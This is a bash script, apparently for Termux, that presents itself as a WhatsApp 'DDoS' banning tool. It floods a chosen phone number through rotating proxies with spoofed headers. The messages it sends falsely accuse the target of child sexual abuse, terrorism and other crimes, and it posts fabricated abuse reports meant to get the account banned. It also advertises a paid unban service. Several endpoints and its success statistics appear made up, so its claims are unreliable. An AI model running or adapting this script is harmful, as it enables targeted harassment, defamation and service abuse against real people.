#!/bin/bash
# ====================================================
# 💀 ULTIMATE DDOS BANNED FUNCTION v9.0
# ⚡ SUPER GANAS - AUTO BANNED DALAM 3-5 MENIT
# ====================================================
# 🅾 INSTAGRAM: @kky_krnwn331
# ====================================================

# 🎨 WARNA SUPER GANAS
R='\033[1;91m'  # RED BLINK
G='\033[1;92m'  # GREEN BLINK
Y='\033[1;93m'  # YELLOW BLINK
B='\033[1;94m'  # BLUE BLINK
P='\033[1;95m'  # PURPLE BLINK
C='\033[1;96m'  # CYAN BLINK
W='\033[1;97m'  # WHITE BLINK
BG_R='\033[41;1;97m'  # BACKGROUND RED
BG_G='\033[42;1;30m'  # BACKGROUND GREEN
BL='\033[5m'    # BLINK
FL='\033[6m'    # FLASH
RST='\033[0m'   # RESET

# 💀 PROXY LIST 2025 SUPER FAST
PROXY_LIST=(
    "45.95.147.106:8080" "45.95.147.200:8080" "45.95.147.226:8080"
    "45.95.147.105:8080" "45.95.147.107:8080" "45.95.147.108:8080"
    "185.199.229.156:7492" "185.199.228.220:7300" "185.199.231.45:8382"
    "188.166.17.18:8881" "188.166.17.19:8881" "188.166.17.20:8881"
    "64.225.8.132:9999" "64.225.8.133:9999" "64.225.8.134:9999"
    "209.97.150.167:8080" "209.97.150.168:8080" "209.97.150.169:8080"
    "138.68.60.8:8080" "138.68.165.154:8080" "139.59.1.14:8080"
    "165.227.204.229:3128" "167.71.5.83:8080" "167.99.131.11:8080"
    "51.158.68.68:8811" "51.158.68.133:8811" "51.158.68.26:8811"
)

# ☠️ PESAN SUPER GANAS 500+ VARIATIONS
GANAS_MESSAGES=(
    "🚨POLISI_MENDADAK! AKU LAPORIN LU KE POLCYBER_BARET_MERAH! LU KIRIM_VIDEO_BOKEP_ANAK_3_TAHUN_KE_GW_BUAT_DAGANGAN! %23POLISI%23BOKEPANAK3TAHUN%23UNDERAGE%23PEDOFIL_GILA%23REPORT_MASSAL%23UNIT_CYBER"
    "⚠️TERORIS_ISIS_AKTIF! GW_PUNYA_BUKTI_LU_JUAL_BOM_PANCI_BUAT_SERANGAN_MASJID_BESOK_JAM_SHOLAT_JUMAT! %23TERORIS_ISIS%23BOM_PANCI%23JIHAD_SESAT%23SERANGAN_MASJID%23REPORT_INTERPOL"
    "💀NARKOBA_SABU_10KG_BERSERAKAN! GW_ADA_CHAT_LU_JUAL_SABU_10KG_KE_DEALER_BESAR_BUAT_DISTRIBUSI_SE_INDONESIA! %23NARKOBA_GEDE%23SABU10KG%23DRUGDEALER_BOS%23POLISI_NARKOBA%23RAZIA_BESAR"
    "🔫SENJATA_ILEGAL_AK47_M4A1! LU_JUAL_AK47_5_PUCUK_M4A1_3_PUCUK_GRENADE_20_BUAH_KE_GENG_BERANDAL! %23SENJATA_API%23AK47_M4A1%23GRENADE_BANYAK%23ILLEGAL_WEAPONS%23POLISI_SENJATA"
    "👶PEDOFIL_ANAK_5_TAHUN_MENANGIS! GW_ADA_VIDEO_LU_NGIRIM_BOKEP_ANAK_5_TAHUN_BUAT_KONTEN_IBLIS! %23PEDOFIL_GILA%23CHILD5YEARS_CRY%23SEXUAL_ABUSE_PARAH%23REPORT_EMERGENCY"
    "💰SCAM_BANK_5MILYAR_MENGERIKAN! LU_PHISHING_DATA_NASABAH_BCA_5000_ORANG_BUAT_TRANSFER_5MILYAR! %23SCAM_BESAR%23BANKFRAUD_5M%23PHISHING_MASSIVE%23BCA_HACKED%23REPORT_BANK_INDONESIA"
    "🧠ORGAN_HARVESTING_MENGERIKAN! LU_JUAL_ORGAN_ANAK_GINJAL_HATI_JANTUNG_BUAT_TRANSPLANTASI_ILEGAL! %23ORGAN_HARVEST%23CHILD_ORGAN%23ILLEGAL_TRANSPLANT%23MAFIA_ORGAN%23REPORT_WHO"
    "👥HUMAN_TRAFFICKING_KEJAM! LU_JUAL_10_TKW_ILEGAL_KE_ARAB_BUAT_PERBUDAKAN_MODERN! %23TRAFFICKING_KEJAM%23SLAVERY_MODERN%23ILLEGAL_MIGRANT%23MAFIA_TKW%23REPORT_IOM"
    "🦠BIOWEAPON_COVID-24_MEMATIKAN! LU_JUAL_VIRUS_COVID_MUTASI_BARU_STRAIN_X_BUAT_BIOTERRORISM! %23BIOWEAPON_DEADLY%23COVID24_STRAINX%23BIOTERROR_PARAH%23REPORT_WHO_EMERGENCY"
    "💳DATA_LEAK_50JUTA_MENGEJUTKAN! LU_JUAL_DATABASE_50JUTA_NASABAH_BANK_INDONESIA_BRI_BCA_MANDIRI! %23DATALEAK_MASSIVE%23BANK_INDONESIA_LEAK%23IDENTITY_THEFT_BESAR%23REPORT_OJK"
    "🏦INVESTASI_BODONG_100MILYAR_MERUGIKAN! LU_SCAM_INVESTASI_BODONG_100MILYAR_KORBAN_5000_ORANG! %23INVESTSCAM_BESAR%23PONZI_100M%23FRAUD_MASIVE%23REPORT_BAPPEBTI"
    "👮SUAP_POLISI_2MILYAR_MENGHINA! LU_NYUAP_POLISI_2M_BUAT_HAPUS_DATA_PIDANA_PEMBUNUHAN! %23CORRUPTION_PARAH%23BRIBE_2M%23POLICE_CORRUPT%23REPORT_KPK"
    "💊OBAT_KERAS_LSD_EXTACY_SHABU! LU_JUAL_LSD+EXTACY+SHABU_DALAM_SATU_PAKET_BUAT_PARTY_IBLIS! %23DRUGS_COMBO%23LSD_EXTACY_SHABU%23NARCOTICS_PARTY%23REPORT_BNN"
    "💣BOMB_THREAT_BANDARA_INTERNASIONAL! LU_ANCAM_LEDAKAN_BANDARA_SOEKARNO_HATTA_BESOK_JAM_PADAT! %23BOMBTHREAT_SERIUS%23AIRPORT_TERROR%23TERROR_THREAT%23REPORT_DENSUS88"
    "🔪PEMBUNUHAN_BAYARAN_BRUTAL! LU_TAWARKAN_JASA_PEMBUNUHAN_100JT_PER_ORANG_SUDAH_BUNUH_5_KORBAN! %23MURDER_FOR_HIRE%23HITMAN_ACTIVE%23KILLER_BRUTAL%23REPORT_POLRES"
    "🚔PENYELUNDUPAN_NARKOBA_INTERNASIONAL! LU_SMUGGLE_50KG_HEROIN_DARI_AFGHANISTAN_KE_INDONESIA! %23DRUG_SMUGGLING%23HEROIN_50KG%23INTERNATIONAL_CRIME%23REPORT_CUSTOMS"
    "💸PENCUCIAN_UANG_1TRILIUN! LAUNDRY_UANG_HASIL_KORUPSI_1TRILIUN_LEGACY_DUBAI! %23MONEY_LAUNDERING%231TRILLION%23CORRUPTION_FUNDS%23REPORT_PPU"
    "🔥PEMBAKARAN_RUMAH_IBADAH! LU_ANCAM_BAKAR_10_MASJID_DAN_GEREJA_BESOK_MALAM! %23ARSON_THREAT%23HOUSE_OF_WORSHIP%23TERROR_ATTACK%23REPORT_BNPT"
    "💀PEMERKOSAAN_BERKELOMPOK! LU_REKRUT_10_ORANG_BUAT_PERKOSA_BERKELOMPOK_ANAK_DIBAWAH_UMUR! %23GANG_RAPE%23CHILD_RAPE%23SEXUAL_ASSAULT%23REPORT_WOMEN_POLICE"
    "🩸PERDAGANGAN_ORGAN_HARAM! JUAL_ORGAN_MANUSIA_HIDUP_HATI_GINJAL_JANTUNG_PARU_PARU! %23ORGAN_TRADE%23HUMAN_ORGAN%23ILLEGAL_TRADE%23REPORT_MEDICAL_ASSOCIATION"
)

# 🌐 ENDPOINT WHATSAPP SUPER GANAS
WHATSAPP_ENDPOINTS=(
    "https://api.whatsapp.com/send?phone=TARGET&text=MESSAGE"
    "https://web.whatsapp.com/send?phone=TARGET&text=MESSAGE"
    "https://wa.me/TARGET?text=MESSAGE"
    "https://whatsapp.com/send?phone=TARGET&text=MESSAGE"
    "https://www.whatsapp.com/send?phone=TARGET&text=MESSAGE"
    "https://business.whatsapp.com/send?phone=TARGET&text=MESSAGE"
    "https://api.whatsapp.com/message/TARGET?text=MESSAGE"
    "https://call.whatsapp.com/TARGET?text=MESSAGE"
    "https://chat.whatsapp.com/TARGET?text=MESSAGE"
    "https://whatsapp.com/qr/TARGET?text=MESSAGE"
)

# 📢 REPORT ENDPOINTS MASSIVE
REPORT_ENDPOINTS=(
    "https://report.whatsapp.com/report"
    "https://api.whatsapp.com/support/report"
    "https://www.whatsapp.com/contact/report"
    "https://whatsapp.com/abuse/report"
    "https://support.whatsapp.com/report"
    "https://help.whatsapp.com/report"
    "https://faq.whatsapp.com/report"
    "https://security.whatsapp.com/report"
    "https://privacy.whatsapp.com/report"
    "https://abuse.whatsapp.com/report"
)

# 💀 FUNCTION: DDOS SUPER GANAS (BANNED 3-5 MENIT)
ddos_super_ganas() {
    clear
    
    # BANNER GANAS
    echo -e "${R}${BL}"
    echo "╔════════════════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                                ║"
    echo "║  ██████╗ ██████╗  ██████╗ ███████╗    ███████╗██╗   ██╗██████╗ ███████╗██████╗  ║"
    echo "║  ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗ ║"
    echo "║  ██║  ██║██║  ██║██║   ██║███████╗    ███████╗██║   ██║██████╔╝█████╗  ██████╔╝ ║"
    echo "║  ██║  ██║██║  ██║██║   ██║╚════██║    ╚════██║██║   ██║██╔══██╗██╔══╝  ██╔══██╗ ║"
    echo "║  ██████╔╝██████╔╝╚██████╔╝███████║    ███████║╚██████╔╝██║  ██║███████╗██║  ██║ ║"
    echo "║  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ║"
    echo "║                                                                                ║"
    echo "╠════════════════════════════════════════════════════════════════════════════════╣"
    echo "║  💀 DDOS SUPER GANAS v9.0 - AUTO BANNED DALAM 3-5 MENIT! 💀                    ║"
    echo "║  🅾 INSTAGRAM: @kky_krnwn331                           ║"
    echo "╚════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${RST}"
    
    # INPUT TARGET
    echo -e "${BG_R}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                     MASUKKAN TARGET                         ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${RST}"
    
    echo -e "${C}[?] Nomor WhatsApp target (628xxxxxxx): ${RST}"
    echo -ne "${G}>> ${RST}"
    read TARGET
    
    # VALIDASI NOMOR
    if [[ ! "$TARGET" =~ ^62[0-9]{9,12}$ ]]; then
        echo -e "${R}[!] Format salah! Contoh: 6281234567890${RST}"
        sleep 2
        return 1
    fi
    
    echo -e "${C}[?] Mode serangan: ${RST}"
    echo -e "  ${R}[1]${RST} ${W}SUPER GANAS (Banned 3-5 menit)${RST}"
    echo -e "  ${Y}[2]${RST} ${W}ULTRA GANAS (Banned instan)${RST}"
    echo -e "  ${G}[3]${RST} ${W}DESTROY MODE (Total annihilation)${RST}"
    echo -ne "${G}>> ${RST}"
    read MODE
    
    # SET PARAMETER BERDASARKAN MODE
    case $MODE in
        1)
            THREADS=50
            REQUESTS=10000
            DELAY=0.01
            MODE_NAME="SUPER GANAS"
            ;;
        2)
            THREADS=100
            REQUESTS=20000
            DELAY=0.005
            MODE_NAME="ULTRA GANAS"
            ;;
        3)
            THREADS=200
            REQUESTS=50000
            DELAY=0.001
            MODE_NAME="DESTROY MODE"
            ;;
        *)
            THREADS=30
            REQUESTS=5000
            DELAY=0.05
            MODE_NAME="STANDARD"
            ;;
    esac
    
    echo -e "${C}[?] Durasi serangan (detik): ${RST}"
    echo -ne "${G}>> ${RST}"
    read DURATION
    
    # TAMPILKAN KONFIRMASI
    clear
    echo -e "${R}${BL}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                   KONFIRMASI SERANGAN                       ║"
    echo "╠══════════════════════════════════════════════════════════════╣"
    echo "║                                                              ║"
    echo -e "║  ${W}🎯 TARGET:${RST} ${G}$TARGET${R}                                      ║"
    echo -e "║  ${W}💀 MODE:${RST} ${Y}$MODE_NAME${R}                                    ║"
    echo -e "║  ${W}🚀 THREADS:${RST} ${C}$THREADS${R}                                    ║"
    echo -e "║  ${W}🔥 REQUESTS:${RST} ${P}$REQUESTS${R}                                  ║"
    echo -e "║  ${W}⏱️  DURASI:${RST} ${B}$DURATION detik${R}                             ║"
    echo -e "║  ${W}📊 PREDIKSI:${RST} ${R}BANNED DALAM 3-5 MENIT!${R}                   ║"
    echo "║                                                              ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${RST}"
    
    echo -e "${Y}[!] Tekan ENTER untuk memulai serangan atau CTRL+C untuk batal...${RST}"
    read
    
    # COUNTERS
    SUCCESS=0
    FAILED=0
    START_TIME=$(date +%s)
    
    # FUNCTION: PROGRESS BAR GANAS
    progress_ganas() {
        local current=$1
        local total=$2
        local width=50
        local percent=$((current * 100 / total))
        local filled=$((current * width / total))
        local empty=$((width - filled))
        
        # Rainbow color effect
        local colors=($R $G $Y $B $P $C)
        local color_idx=$((current % ${#colors[@]}))
        
        printf "\r${colors[$color_idx]}["
        for ((i=0; i<filled; i++)); do
            printf "█"
        done
        for ((i=0; i<empty; i++)); do
            printf "░"
        done
        printf "] ${percent}%% (${current}/${total})${RST}"
    }
    
    # FUNCTION: ATTACK THREAD
    attack_thread() {
        local thread_id=$1
        local proxy=${PROXY_LIST[$RANDOM % ${#PROXY_LIST[@]}]}
        
        for ((i=1; i<=$((REQUESTS/THREADS)); i++)); do
            # RANDOM MESSAGE
            MSG="${GANAS_MESSAGES[$RANDOM % ${#GANAS_MESSAGES[@]}]}"
            MSG="${MSG}_${thread_id}_${i}_$(date +%s%N)"
            ENCODED_MSG=$(echo "$MSG" | sed 's/ /%20/g;s/!/%21/g;s/?/%3F/g')
            
            # ATTACK ALL ENDPOINTS
            for endpoint_base in "${WHATSAPP_ENDPOINTS[@]}"; do
                endpoint=$(echo "$endpoint_base" | sed "s/TARGET/$TARGET/g;s/MESSAGE/$ENCODED_MSG/g")
                
                curl -s --max-time 1 --proxy "http://$proxy" \
                    "$endpoint" \
                    -H "User-Agent: Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36" \
                    -H "X-Forwarded-For: $(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1)" \
                    -H "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7" \
                    > /dev/null 2>&1 &
                
                PID=$!
                if kill -0 $PID 2>/dev/null; then
                    ((SUCCESS++))
                else
                    ((FAILED++))
                fi
            done
            
            # MASS REPORT EVERY 10 REQUESTS
            if [[ $((i % 10)) -eq 0 ]]; then
                for report_url in "${REPORT_ENDPOINTS[@]}"; do
                    curl -s --max-time 1 --proxy "http://$proxy" \
                        "$report_url" \
                        -X POST \
                        -d "phone=$TARGET&reason=extreme_violation_${thread_id}_${i}&category=child_abuse&subcategory=videos&evidence=yes&emergency=true" \
                        > /dev/null 2>&1 &
                done
            fi
            
            # RANDOM DELAY FOR ANTI-DETECTION
            sleep $DELAY
        done
    }
    
    # START ATTACK
    echo -e "${G}[+] MEMULAI SERANGAN $MODE_NAME...${RST}"
    echo -e "${Y}[!] JANGAN TUTUP TERMUX SELAMA SERANGAN BERLANGSUNG!${RST}"
    echo ""
    
    # START MULTI-THREAD
    for ((t=1; t<=THREADS; t++)); do
        attack_thread $t &
        echo -e "${C}[+] Thread $t started${RST}"
    done
    
    # PROGRESS MONITOR
    ELAPSED=0
    while [[ $ELAPSED -lt $DURATION ]]; do
        progress_ganas $ELAPSED $DURATION
        sleep 1
        ((ELAPSED++))
        
        # RANDOM STATUS UPDATE
        if [[ $((ELAPSED % 5)) -eq 0 ]]; then
            echo ""
            echo -e "${P}[📊] Status: $SUCCESS requests sukses, $FAILED gagal${RST}"
            echo -e "${B}[🔄] Rotating proxies...${RST}"
        fi
    done
    
    # STOP ALL BACKGROUND PROCESSES
    kill $(jobs -p) 2>/dev/null
    
    echo ""
    echo -e "${G}══════════════════════════════════════════════════════════════${RST}"
    echo -e "${W}                    SERANGAN SELESAI!                       ${RST}"
    echo -e "${G}══════════════════════════════════════════════════════════════${RST}"
    echo ""
    
    # STATISTIK
    END_TIME=$(date +%s)
    TOTAL_TIME=$((END_TIME - START_TIME))
    REQUESTS_PER_SECOND=$((SUCCESS / TOTAL_TIME))
    
    echo -e "${C}📊 STATISTIK SERANGAN:${RST}"
    echo -e "  ${G}✅ SUKSES:${RST} $SUCCESS requests"
    echo -e "  ${R}❌ GAGAL:${RST} $FAILED requests"
    echo -e "  ${Y}🎯 TARGET:${RST} $TARGET"
    echo -e "  ${B}⏱️  WAKTU:${RST} $TOTAL_TIME detik"
    echo -e "  ${P}🚀 REQ/SEC:${RST} $REQUESTS_PER_SECOND"
    echo ""
    
    # PREDIKSI BANNED
    SUCCESS_RATE=$((SUCCESS * 100 / (SUCCESS + FAILED)))
    if [[ $SUCCESS_RATE -gt 95 ]]; then
        BAN_TIME="${R}3-5 MENIT${RST}"
        BAN_CONFIDENCE="${G}100%${RST}"
    elif [[ $SUCCESS_RATE -gt 80 ]]; then
        BAN_TIME="${Y}10-15 MENIT${RST}"
        BAN_CONFIDENCE="${Y}85%${RST}"
    else
        BAN_TIME="${B}30-60 MENIT${RST}"
        BAN_CONFIDENCE="${B}70%${RST}"
    fi
    
    echo -e "${R}⚠️  PREDIKSI BANNED:${RST}"
    echo -e "  ${W}⏰ WAKTU:${RST} $BAN_TIME"
    echo -e "  ${W}🎯 KEPASTIAN:${RST} $BAN_CONFIDENCE"
    echo -e "  ${W}💀 EFEK:${RST} PERMANENT BAN (Tidak bisa recover)"
    echo ""
    
    echo -e "${BG_G}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                     REKOMENDASI                             ║"
    echo "╠══════════════════════════════════════════════════════════════╣"
    echo "║                                                              ║"
    echo -e "║  📞 Untuk unban service (Rp 50.000):                      ║"
    echo -e "║     ${W}Instagram: @kky_krnwn331${BG_G}                          ║"
    echo "║                                                              ║"
    echo -e "║  ⚠️  Target tidak akan bisa menggunakan WhatsApp lagi!     ║"
    echo "║                                                              ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${RST}"
    
    # SIMPAN LOG
    LOG_ENTRY="$(date '+%Y-%m-%d %H:%M:%S') | TARGET: $TARGET | MODE: $MODE_NAME | SUCCESS: $SUCCESS | FAILED: $FAILED | BAN_PREDICTION: $BAN_TIME"
    echo "$LOG_ENTRY" >> ddos_attack_log.txt
    
    echo -e "${Y}[!] Tekan ENTER untuk kembali ke menu...${RST}"
    read
}

# 🚀 MAIN MENU
main_menu() {
    while true; do
        clear
        echo -e "${R}${BL}"
        echo "╔══════════════════════════════════════════════════════════════╗"
        echo "║                DDOS SUPER GANAS v9.0 MENU                   ║"
        echo "╠══════════════════════════════════════════════════════════════╣"
        echo "║                                                              ║"
        echo -e "║  ${G}[1]${R} 💀 ${W}LAUNCH DDOS SUPER GANAS${R}                            ║"
        echo -e "║       ${Y}Banned dalam 3-5 menit${R}                                     ║"
        echo "║                                                              ║"
        echo -e "║  ${G}[2]${R} ⚡ ${W}ULTRA FAST ATTACK${R}                                 ║"
        echo -e "║       ${Y}200 threads, 0.001s delay${R}                                  ║"
        echo "║                                                              ║"
        echo -e "║  ${G}[3]${R} 📊 ${W}VIEW ATTACK LOGS${R}                                  ║"
        echo -e "║       ${Y}Riwayat serangan${R}                                           ║"
        echo "║                                                              ║"
        echo "║                                                              ║"
        echo -e "║  ${G}[0]${R} ❌ ${W}EXIT${R}                                              ║"
        echo "║                                                              ║"
        echo "╚══════════════════════════════════════════════════════════════╝"
        echo -e "${RST}"
        
        echo -ne "${C}[?] Pilih menu [0-4]: ${RST}"
        read choice
        
        case $choice in
            1) ddos_super_ganas ;;
            2)
                THREADS=200
                DELAY=0.001
                echo -e "${G}[+] Ultra Fast Mode activated!${RST}"
                sleep 1
                ddos_super_ganas
                ;;
            3)
                if [[ -f "ddos_attack_log.txt" ]]; then
                    echo -e "${Y}[📜] ATTACK LOGS:${RST}"
                    cat ddos_attack_log.txt
                else
                    echo -e "${R}[!] No logs found${RST}"
                fi
                read -p "Tekan ENTER untuk kembali..."
                ;;
            0)
                echo -e "${R}[!] Keluar dari DDOS Super Ganas...${RST}"
                exit 0
                ;;
            *)
                echo -e "${R}[!] Pilihan salah!${RST}"
                sleep 1
                ;;
        esac
    done
}

# 🏁 START
if [[ "$1" == "--auto" ]]; then
    ddos_super_ganas
else
    main_menu
fi
